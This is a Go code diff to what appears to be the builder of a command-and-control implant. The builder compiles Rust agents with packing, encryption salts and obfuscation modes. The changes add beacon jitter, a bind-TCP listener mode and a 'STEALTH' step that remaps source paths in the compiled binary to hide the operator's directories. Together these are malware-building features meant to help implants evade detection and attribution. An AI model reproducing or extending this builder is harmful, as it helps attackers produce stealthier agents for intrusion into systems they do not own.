@@ -35,6 +35,7 @@ type PayloadConfig struct {
 	UseUPX            bool   `json:"use_upx"`
 	EncryptionSalt    string `json:"encryption_salt"`
 	ObfuscationMode   string `json:"obfuscation_mode"`
+	Jitter            int    `json:"jitter"`
 }
 
 // copyDir recursively copies a directory tree
@@ -92,7 +93,7 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 		if logChan != nil { logChan <- "[Builder] 使用系统默认加密密钥" }
 	}
 
-	if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.DNSResolver, conf.EncryptionSalt, conf.ObfuscationMode); err != nil {
+	if err := patchConfig(configPath, connStr, aesKey, conf.HeartbeatInterval, conf.Jitter, conf.DNSResolver, conf.EncryptionSalt, conf.ObfuscationMode); err != nil {
 		return "", fmt.Errorf("config patch failed: %v", err)
 	}
 
@@ -133,6 +134,8 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 
 	if protocol == "tcp" {
 		args = append(args, "--no-default-features", "--features", "tcp")
+	} else if strings.EqualFold(protocol, "Bind-TCP") || protocol == "正向TCP" {
+		args = append(args, "--no-default-features", "--features", "tcp_bind")
 	} else if protocol == "dns" {
 		args = append(args, "--no-default-features", "--features", "dns")
 	} else {
@@ -151,10 +154,14 @@ func BuildAgentWithLogger(conf PayloadConfig, logChan chan<- string) (string, er
 	
 	// Add parent environment and force color/progress
 	// ⚡ OPTIMIZATION: Use a centralized target directory to enable incremental compilation
+	// 🛡️ STEALTH: Remap source paths to hide local directory structure
 	absTargetDir, _ := filepath.Abs(SharedTargetDir)
+	absWorkspace, _ := filepath.Abs(workspace)
+	
 	cmd.Env = append(os.Environ(), 
 		"CARGO_TERM_COLOR=never",
 		fmt.Sprintf("CARGO_TARGET_DIR=%s", absTargetDir),
+		fmt.Sprintf("RUSTFLAGS=--remap-path-prefix %s=/cupcake --remap-path-prefix %s=/rust", absWorkspace, os.Getenv("USERPROFILE")),
 	)
 	
 	// Stream logs: Combine Stdout and Stderr to avoid MultiReader blocking
@@ -314,7 +321,7 @@ func copyFile(src, dst string) error {
 	return err
 }
 
-func patchConfig(path, connStr, aesKey string, heartbeat int, dnsResolver string, salt string, obfMode string) error {
+func patchConfig(path, connStr, aesKey string, heartbeat int, jitter int, dnsResolver string, salt string, obfMode string) error {
 	content, err := os.ReadFile(path)
 	if err != nil { return err }
 	s := string(content)
@@ -335,6 +342,10 @@ func patchConfig(path, connStr, aesKey string, heartbeat int, dnsResolver string
 	// Do NOT touch SYSTEM_PROVIDER_CRYPTO_KDF_SALT or OBF_MODE_STRICT in source code
 	// because they are fixed-size arrays and changing their literal length breaks compilation.
 	s = strings.Replace(s, "REPLACE_ME_SALT", salt, 1)
+	
+	// 4. Jitter Patch
+	jitterStr := fmt.Sprintf("%d", jitter)
+	s = strings.Replace(s, "REPLACE_ME_JITTER", jitterStr, 1)
 	
 	obfVal := strings.ToLower(obfMode)
 	if obfVal == "" { obfVal = "none" }
